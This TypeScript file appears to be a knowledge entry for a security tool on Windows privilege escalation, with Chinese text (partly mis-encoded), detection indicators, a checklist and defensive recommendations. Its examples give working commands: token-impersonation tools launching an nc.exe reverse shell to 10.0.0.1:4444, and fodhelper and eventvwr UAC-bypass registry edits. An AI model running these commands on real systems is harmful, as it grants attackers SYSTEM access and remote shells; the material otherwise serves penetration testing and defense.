/**
 * HOS-Sec-Engine V2 - Windows Privilege Escalation Skills
 */

import { AttackDefenseSkill } from '\.\./\.\./\.\./types/skill';

export const windowsPrivEscSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'windows-priv-esc-001',
            name: 'Windows Privilege Escalation Techniques',
            category: 'windows',
            subCategory: 'privilege-escalation',
            riskLevel: 'critical',
            confidence: 0.94,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: ['windows', 'privilege-escalation', 'priv-esc', 'system', 'administrator', 'uac'],
        },
        trigger: {
            scenarios: [
                '获取普通用户权限后需要提升到 SYSTEM ?Administrator',
                '发现服务配置权限错误',
                '发现可写系统目录或注册表',
                '需要绕?UAC 权限提升',
                '发现令牌 (Token) 操作机会',
            ],
            keywords: [
                'windows privilege escalation',
                '提权',
                'system privilege',
                'uac bypass',
                'token impersonation',
                'service exploit',
                'windows 权限提升',
                'potato exploit',
                'juicy potato',
                'rogue potato',
            ],
            aliases: [
                'priv esc',
                'local privilege escalation',
                'LPE',
                'UAC bypass',
                'Token theft',
            ],
            indicators: [
                'SeImpersonatePrivilege',
                'SeAssignPrimaryToken',
                'Unquoted Service Path',
                'Writable ProgramFiles',
                'AlwaysInstallElevated',
            ],
        },
        knowledge: {
            description: 'Windows 权限提升技术用于在获取低权?shell 后提升到 SYSTEM ?Administrator 权限。Windows 系统存在多种提权路径：服务配置错误、可写系统路径、令牌操作、UAC 绕过、内核漏洞利用等。提权成功取决于系统配置、权限和补丁级别',
            symptoms: [
                '当前用户具有 SeImpersonatePrivilege ?SeAssignPrimaryToken',
                '系统服务?SYSTEM 运行但可修改',
                '注册表键可写?AlwaysInstallElevated',
                'DLL 劫持路径可写',
                'UAC 未完全启?',
            ],
            rootCauses: [
                '服务配置未限制普通用户修改权',
                '系统目录权限配置过松',
                '用户被授予危险特?(SeImpersonatePrivilege ?',
                'UAC 配置不完整或可绕',
                '未安装最新安全补',
                '计划任务权限配置不当',
            ],
            observations: [
                'SeImpersonatePrivilege ?Windows 服务账户最常见的提权入',
                'Juicy Potato ?Rogue Potato 是经典的令牌劫持利用',
                '服务路径引号缺失是常见的低级配置错误',
                'UAC 绕过技术因 Windows 版本而异',
                'AlwaysInstallElevated 策略常被忽略',
            ],
            commonMistakes: [
                '忽略枚举当前用户特权 (whoami /priv)',
                '未检查所有运行中的服务权',
                '忽略 DLL 劫持的可能',
                '未考虑令牌窃取技?',
            ],
            notes: [
                '提权方法高度依赖 Windows 版本和补丁级',
                '某些技术需要特定权限才能触',
                '应在授权测试环境中验?',
            ],
        },
        action: {
            checklist: [
                '枚举当前用户信息和特?(whoami /all)',
                '检查系统补丁级?(systeminfo)',
                '枚举运行中的服务和权',
                '检查可写系统目录和注册',
                '检?AlwaysInstallElevated 策略',
                '检查服务路径引号问',
                '检查令牌特',
                '检?UAC 配置',
                '使用 WinPEAS 等自动化枚举工具',
            ],
            techniques: [
                '令牌窃取 (Incognito, RoguePotato)',
                'UAC 绕过 (fodhelper, eventvwr)',
                '服务配置滥用',
                'DLL 劫持',
                'AlwaysInstallElevated MSI 安装',
                '计划任务滥用',
                '注册?Run 键写',
                '内核漏洞利用 (未打补丁)',
            ],
            examples: [
                {
                    name: 'SeImpersonatePrivilege 令牌窃取',
                    description: '利用 SeImpersonatePrivilege 特权进行令牌窃取提权',
                    content: '# 使用 RoguePotato ?JuicyPotato\n' +
                        'RoguePotato.exe -r 127.0.0.1 -e "C:\\Windows\\Temp\\nc.exe" -l 9001\n' +
                        '\n' +
                        '# 或使?PrintSpoofer\n' +
                        'PrintSpoofer.exe -i -c "C:\\Windows\\Temp\\nc.exe 10.0.0.1 4444 -e cmd.exe"\n' +
                        '\n' +
                        '# 使用 GodPotato (支持多版?\n' +
                        'GodPotato-NET4.exe -cmd "C:\\Windows\\Temp\\nc.exe 10.0.0.1 4444 -e cmd.exe"',
                },
                {
                    name: 'UAC 绕过',
                    description: '使用已知 UAC 绕过技术提升完整性级',
                    content: '# 使用 fodhelper 绕过\n' +
                        'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "cmd.exe" /f\n' +
                        'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /d "" /f\n' +
                        'fodhelper.exe\n' +
                        '\n' +
                        '# 或使?eventvwr\n' +
                        'reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /d "cmd.exe" /f\n' +
                        'eventvwr.exe',
                },
            ],
        },
        validation: {
            indicators: [
                'whoami 返回 NT AUTHORITY\\SYSTEM',
                '获取 Administrator 组权',
                '完整性级别从 Medium 提升?High',
                '可以访问之前拒绝的系统资?',
            ],
            successSigns: [
                '成功执行 SYSTEM 权限命令',
                '可以读取 SAM ?SYSTEM 注册',
                '可以创建新用户加?Administrators',
            ],
            falsePositiveSigns: [
                '命令执行成功但权限未提升',
                '令牌劫持失败因补丁修?',
            ],
        },
        defense: {
            recommendations: [
                '移除不必要的用户特权 (SeImpersonatePrivilege ?',
                '启用并强?UAC (AlwaysNotify)',
                '限制服务账户权限',
                '修复服务路径引号问题',
                '禁用 AlwaysInstallElevated',
                '及时安装安全补丁',
                '限制普通用户写系统目录',
            ],
            mitigations: [
                '部署 EDR 检测令牌窃取行',
                '监控异常进程创建',
                '实施应用程序白名?',
            ],
            references: [
                'https://github.com/PowerShellMafia/PowerSploit',
                'https://github.com/carlospolop/PEASS-ng',
                'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation',
            ],
        },
        quality: {
            confidence: 0.94,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        enabled: true,
    },
];
